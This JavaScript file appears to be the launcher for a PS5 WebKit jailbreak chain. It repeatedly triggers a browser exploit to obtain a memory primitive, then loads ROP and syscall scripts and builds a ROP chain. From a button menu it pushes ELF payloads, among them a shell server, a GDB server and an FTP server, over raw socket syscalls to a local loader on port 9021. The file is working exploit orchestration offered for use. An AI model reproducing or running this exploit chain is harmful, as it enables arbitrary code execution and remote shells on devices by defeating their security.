import { establishPrimitive, fakeCellReleased, dropExploitScaffolding }
    from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";

const Q = new URLSearchParams(location.search);
const ARMED = Q.get("go") === "1";
const BUILD = () => window.P2JB_BUILD || "dev";
const MAX_ATTEMPTS = Math.max(1, Math.min(48,
    parseInt(Q.get("attempts") || "24", 10)));

const PAYLOADS = [
    { name: "ftpsrv-ps5.elf", label: "FTP Server" },
    { name: "gdbsrv-ps5.elf", label: "GDB Server" },
    { name: "klogsrv-ps5.elf", label: "Kernel Log" },
    { name: "shsrv-ps5.elf", label: "Shell" },
    { name: "websrv-ps5.elf", label: "Web Server" }
];
const PAYLOAD_PORT = 9021;
const PAYLOAD_BUFFER_SIZE = 0x4000;
const PAYLOAD_MAX_SIZE = 0x200000;

const ui = {
    stageEl: document.getElementById("stage"),
    logEl: document.getElementById("log"),
    menuEl: null,
    verdictEl: null,
    buildTagEl: null
};

const nogcHard = { carrier: null, p: null, chain: null };

let P = null;
let chain = null;
let chainDead = "";
let errConvention = "posix";
let payloadSendBusy = false;
let payloadSendStore = null;
let payloadSockaddrStore = null;
let payloadSocketOptionStore = null;
let payloadSendTimeoutStore = null;

function rebindUi() {
    ui.stageEl = document.getElementById("stage");
    ui.logEl = document.getElementById("log");
    ui.menuEl = document.getElementById("menu");
    ui.verdictEl = document.getElementById("verdict");
    ui.buildTagEl = document.getElementById("buildTag");
}

function stage(text, cls) {
    ui.stageEl.textContent = text;
    ui.stageEl.className = cls || "";
}

function logLine(text) {
    ui.logEl.textContent += text + "\n";
    ui.logEl.scrollTop = ui.logEl.scrollHeight;
}

async function memoryRelief(ms) {
    if (typeof globalThis.gc === "function") {
        for (let i = 0; i < 6; ++i) {
            try { globalThis.gc(); } catch (e) { }
        }
    }
    await new Promise(r => setTimeout(r, ms));
    if (typeof globalThis.gc === "function") {
        for (let i = 0; i < 3; ++i) {
            try { globalThis.gc(); } catch (e) { }
        }
    }
}

function purgeDocumentShell() {
    const savedLog = ui.logEl.textContent;
    document.open();
    document.write(
        "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">"
        + "<title>P2JB Payload Menu</title>"
        + "<style>"
        + "html,body{margin:0;padding:20px;background:#0c111b;color:#c8ced8;"
        + "font:16px/1.45 system-ui,sans-serif}"
        + "h1{margin:0 0 4px;color:#eceff4;font-size:24px}"
        + "#buildTag{color:#6d8aab;font-size:13px;margin-bottom:16px}"
        + "#stage{min-height:1.4em;margin-bottom:12px;color:#9fb1c3}"
        + "#stage.ok{color:#a3be8c}#stage.bad{color:#bf616a}"
        + "#verdict{margin-bottom:16px;color:#d8dee9}"
        + "#menu{display:none;flex-direction:column;gap:10px;max-width:320px}"
        + "#menu.on{display:flex}"
        + ".payloadBtn{padding:14px 18px;border:1px solid rgba(255,255,255,.18);"
        + "border-radius:12px;background:linear-gradient(135deg,#273850,#172235);"
        + "color:#eaf2ff;font:600 17px/1 system-ui,sans-serif;cursor:pointer;"
        + "text-align:left}"
        + "#log{margin-top:20px;max-height:30vh;overflow:auto;font:12px/1.4 monospace;"
        + "color:#6d8aab;white-space:pre-wrap;word-break:break-word}"
        + "</style></head><body>"
        + "<h1>Payload Menu</h1>"
        + "<div id=\"buildTag\"></div>"
        + "<div id=\"stage\"></div>"
        + "<div id=\"verdict\"></div>"
        + "<div id=\"menu\"></div>"
        + "<pre id=\"log\"></pre>"
        + "</body></html>"
    );
    document.close();
    rebindUi();
    ui.buildTagEl.textContent = "Build " + BUILD() + " (menu lite)";
    ui.logEl.textContent = savedLog + "document purged\n";
}

function loadScript(src) {
    return new Promise((resolve, reject) => {
        const s = document.createElement("script");
        s.src = src;
        s.onload = () => resolve();
        s.onerror = () => reject(new Error("script load failed: " + src));
        document.head.appendChild(s);
    });
}

function waitOffsetsScript() {
    return new Promise((resolve, reject) => {
        const deadline = Date.now() + 15000;
        (function poll() {
            const s = document.querySelector('script[src^="../offsets/"]');
            if (s) {
                if (typeof OFFSET_wk_vtable_first_element !== "undefined")
                    return resolve(s.src);
                s.addEventListener("load", () => resolve(s.src));
                s.addEventListener("error", () => reject(new Error("offsets 404: " + s.src)));
                return;
            }
            if (Date.now() > deadline)
                return reject(new Error("offsets script never injected"));
            setTimeout(poll, 10);
        })();
    });
}

async function loadChainScripts() {
    const B = encodeURIComponent(BUILD());
    globalThis.int64 = int64;
    logLine("phase2: rop.js");
    await loadScript("rop.js?b=" + B);
    window.offsetsReady = waitOffsetsScript();
    logLine("phase2: prepare-only.js");
    await loadScript("prepare-only.js?b=" + B);
    logLine("phase2: syscalls.js");
    await loadScript("syscalls.js?b=" + B);
    await window.offsetsReady;
    logLine("phase2: offsets fw=" + window.fw_str);
}

async function preflight() {
    if (typeof prepare !== "function")
        throw new Error("prepare-only.js did not evaluate");
    if (typeof worker_rop !== "function")
        throw new Error("rop.js did not evaluate");
    if (typeof SYS_GETPID === "undefined")
        throw new Error("syscalls.js did not evaluate");
}

function assertInt64Identity() {
    if (globalThis.int64 !== int64)
        throw new Error("int64 identity mismatch");
}

async function bootWebKit() {
    if (globalThis.p && typeof globalThis.p.read8 === "function") {
        logLine("primitive reused");
        return;
    }

    stage("WebKit (~1 in 3, up to " + MAX_ATTEMPTS + " tries)");
    try { history.replaceState(null, ""); } catch (e) { }
    await memoryRelief(750);

    const carrier = await establishPrimitive({
        maxAttempts: MAX_ATTEMPTS,
        onEvent(tag, detail, attempt) {
            if (tag === "ATTEMPT-START")
                stage("WebKit attempt " + attempt + "…");
        }
    });

    nogcHard.carrier = carrier;
    installWindowP(carrier, { onEvent() { } });
    nogcHard.carrier = null;

    if (!pairStatus.promoted)
        throw new Error("pair not promoted: " + pairStatus.error);
    if (!fakeCellReleased())
        throw new Error("exploit graph not released before prepare");

    logLine("primitive up released=" + fakeCellReleased()
        + " history=" + (history.state === null));

    dropExploitScaffolding();
    await memoryRelief(1500);
}

async function postPreparePark() {
    globalThis.p = undefined;
    try {
        window.prepare = undefined;
        window.worker_rop = undefined;
    } catch (e) { }
    for (const sel of ['script[src*="rop.js"]', 'script[src*="prepare-only.js"]']) {
        const el = document.querySelector(sel);
        if (el) el.remove();
    }
    try {
        const lines = ui.logEl.textContent.split("\n");
        ui.logEl.textContent = lines.slice(-3).join("\n") + "\n";
    } catch (e) { }
    await memoryRelief(1000);
    logLine("prepare() ok — parked");
}

async function bootPrepare() {
    const p = globalThis.p;
    if (!p || typeof p.read8 !== "function")
        throw new Error("window.p missing");
    nogcHard.p = p;
    assertInt64Identity();

    stage("prepare()");
    logLine("prepare() enter");
    const prepared = await prepare(p, {
        menu: true,
        stackSize: 0x28000,
        reservedStack: 0x4000
    });
    P = prepared.p;
    chain = prepared.chain;
    nogcHard.chain = chain;
    await postPreparePark();
}

function classify(raw) {
    const s32 = ((raw.low << 0) >> 0);
    return { s32, failed: s32 < 0 };
}

function errText(res) {
    if (!res.failed) return "";
    if (errConvention === "posix") return "errno " + (-res.s32);
    return "raw " + res.hex;
}

async function sys(num, a, b, c, d, e, f) {
    if (chainDead)
        throw new Error("chain dead: " + chainDead);
    const raw = await chain.syscall(num, a, b, c, d, e, f);
    const cl = classify(raw);
    return { raw, s32: cl.s32, failed: cl.failed,
        hex: "0x" + raw.toString(),
        errText: errText({ failed: cl.failed, s32: cl.s32, hex: "0x" + raw.toString() }) };
}

function mem(n) {
    const ptr = P.malloc(n, 1);
    return { ptr, u8: ptr.backing };
}

function ensureSockaddr() {
    if (payloadSockaddrStore === null) {
        payloadSockaddrStore = mem(0x10);
        const addr = payloadSockaddrStore.u8;
        addr.fill(0);
        addr[0] = 0x10;
        addr[1] = 0x02;
        addr[2] = (PAYLOAD_PORT >>> 8) & 0xff;
        addr[3] = PAYLOAD_PORT & 0xff;
        addr[4] = 127;
        addr[5] = 0;
        addr[6] = 0;
        addr[7] = 1;
    }
    return payloadSockaddrStore;
}

function preparePayloadSender() {
    ensureSockaddr();
    if (payloadSocketOptionStore === null) {
        payloadSocketOptionStore = mem(4);
        payloadSocketOptionStore.u8.fill(0);
        payloadSocketOptionStore.u8[0] = 1;
    }
    if (payloadSendTimeoutStore === null) {
        payloadSendTimeoutStore = mem(0x10);
        payloadSendTimeoutStore.u8.fill(0);
        payloadSendTimeoutStore.u8[0] = 15;
    }
    if (payloadSendStore === null)
        payloadSendStore = mem(PAYLOAD_BUFFER_SIZE);
}

async function sendPayload(name) {
    if (payloadSendBusy) return;
    payloadSendBusy = true;
    stage("Sending " + name + "…");
    try {
        const response = await fetch("../payloads/" + encodeURIComponent(name),
            { cache: "no-store" });
        if (!response.ok)
            throw new Error("fetch failed: HTTP " + response.status);
        const bytes = new Uint8Array(await response.arrayBuffer());
        if (!bytes.length) throw new Error("empty payload");
        if (bytes.length > PAYLOAD_MAX_SIZE)
            throw new Error("payload exceeds 2 MiB");
        if (bytes[0] !== 0x7f || bytes[1] !== 0x45)
            throw new Error("not an ELF");

        preparePayloadSender();
        let fd = -1;
        let sent = 0;
        try {
            let r = await sys(SYS_SOCKET, 2, 1, 0);
            if (r.failed || r.s32 < 0) throw new Error("socket: " + r.errText);
            fd = r.s32;

            r = await sys(SYS_SETSOCKOPT, fd, 0xffff, 0x0800,
                payloadSocketOptionStore.ptr, 4);
            if (r.failed || r.s32 !== 0)
                throw new Error("setsockopt: " + r.errText);

            r = await sys(SYS_SETSOCKOPT, fd, 0xffff, 0x1005,
                payloadSendTimeoutStore.ptr, 0x10);
            if (r.failed || r.s32 !== 0)
                throw new Error("sndtimeo: " + r.errText);

            r = await sys(SYS_CONNECT, fd, payloadSockaddrStore.ptr, 0x10);
            if (r.failed || r.s32 !== 0)
                throw new Error("connect: " + r.errText);

            while (sent < bytes.length) {
                const block = Math.min(PAYLOAD_BUFFER_SIZE, bytes.length - sent);
                payloadSendStore.u8.set(bytes.subarray(sent, sent + block), 0);
                let blockSent = 0;
                while (blockSent < block) {
                    r = await sys(SYS_WRITE, fd,
                        payloadSendStore.ptr.add32(blockSent), block - blockSent);
                    if (r.failed || r.s32 <= 0)
                        throw new Error("write: " + r.errText);
                    blockSent += r.s32;
                }
                sent += block;
            }
        } finally {
            if (fd >= 0) await sys(SYS_CLOSE, fd);
        }
        stage(name + " sent (" + sent + " bytes)", "ok");
        logLine("OK " + name + " " + sent + " bytes");
    } catch (e) {
        stage("Send failed: " + ((e && e.message) || e), "bad");
        logLine("FAIL " + name + ": " + ((e && e.message) || e));
    } finally {
        payloadSendBusy = false;
    }
}

async function showMenuDeferred() {
    await memoryRelief(400);
    ui.menuEl.innerHTML = "";
    ui.menuEl.className = "on";
    ui.verdictEl.textContent =
        "Payload manager ready. Pick a payload — sends go to 127.0.0.1:9021.";
    for (const item of PAYLOADS) {
        const btn = document.createElement("button");
        btn.type = "button";
        btn.className = "payloadBtn";
        btn.textContent = item.label;
        btn.addEventListener("click", () => sendPayload(item.name));
        ui.menuEl.appendChild(btn);
    }
    try { ui.menuEl.firstChild.focus(); } catch (e) { }
}

async function main() {
    if (!ARMED) {
        stage("Add ?go=1 or use the index PAYLOAD MENU ONLY button.");
        return;
    }

    logLine("menu boot build=" + BUILD() + " phase1=webkit-only");

    await bootWebKit();

    purgeDocumentShell();
    await memoryRelief(500);

    await loadChainScripts();
    await preflight();
    await bootPrepare();

    stage("Payload manager ready", "ok");
    await showMenuDeferred();
}

main().catch(err => {
    const m = (err && err.message) || String(err);
    stage("Failed: " + m, "bad");
    logLine("FATAL: " + m);
});
